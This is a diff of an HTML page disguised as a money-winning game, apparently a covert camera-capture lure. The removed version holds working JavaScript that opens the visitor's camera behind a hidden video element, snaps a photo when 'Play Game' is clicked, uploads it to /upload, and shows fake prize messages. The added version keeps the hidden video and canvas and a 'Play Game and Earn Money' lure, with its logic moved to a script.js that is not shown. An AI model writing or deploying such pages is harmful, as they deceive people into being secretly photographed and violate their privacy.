@@ -1,110 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Quiz Camera AI</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Play Game and Earn Money</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
       font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #222, #555);
-      color: white;
-      text-align: center;
       margin: 0;
-      padding: 40px;
-    }
-
-    h1 {
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-
-    button {
-      background-color: #4CAF50;
-      border: none;
+      background: linear-gradient(145deg, #1f1f1f, #2d2d2d);
       color: white;
-      padding: 14px 28px;
-      font-size: 18px;
-      border-radius: 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      text-align: center;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 10px;
+      color: #00ff88;
+    }
+    p {
+      margin-bottom: 20px;
+      color: #ccc;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 8px;
+      font-size: 1rem;
       cursor: pointer;
       transition: all 0.3s ease;
     }
-
     button:hover {
-      background-color: #45a049;
+      background-color: #1e7e34;
       transform: scale(1.05);
     }
-
-    video {
-      display: none; /* 👁 Hidden camera preview */
-    }
-
     #status {
-      font-size: 22px;
-      margin-top: 25px;
+      margin-top: 20px;
       font-weight: bold;
-    }
-
-    .active {
-      color: #00ff99;
+      font-size: 1.2rem;
     }
   </style>
 </head>
 <body>
-  <h1>🎮 Game is Active</h1>
+  <h1>💰 Play Game and Win Rewards</h1>
   <p>Click <b>Play Game</b> to try your luck!</p>
-  <button id="playGame">Play Game</button>
-  <video id="video" autoplay playsinline></video>
-  <div id="status"></div>
+  <button id="captureBtn">Play Game</button>
+  <p id="status"></p>
 
-  <script>
-    const video = document.getElementById("video");
-    const playGame = document.getElementById("playGame");
-    const statusDiv = document.getElementById("status");
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-      } catch (err) {
-        alert("Camera access denied!");
-      }
-    }
-
-    async function captureAndUpload() {
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-
-      canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append("photo", blob, "photo.png");
-
-        try {
-          const res = await fetch("/upload", {
-            method: "POST",
-            body: formData,
-          });
-          const data = await res.json();
-
-          if (data.fileUrl) {
-            statusDiv.textContent = "🎉 You got 100 Rs successfully!";
-            statusDiv.style.color = "#00ff99";
-          } else {
-            statusDiv.textContent = "❌ You lost 100 Rs!";
-            statusDiv.style.color = "red";
-          }
-        } catch (e) {
-          statusDiv.textContent = "❌ You lost 100 Rs!";
-          statusDiv.style.color = "red";
-        }
-      }, "image/png");
-    }
-
-    playGame.onclick = () => captureAndUpload();
-
-    startCamera();
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
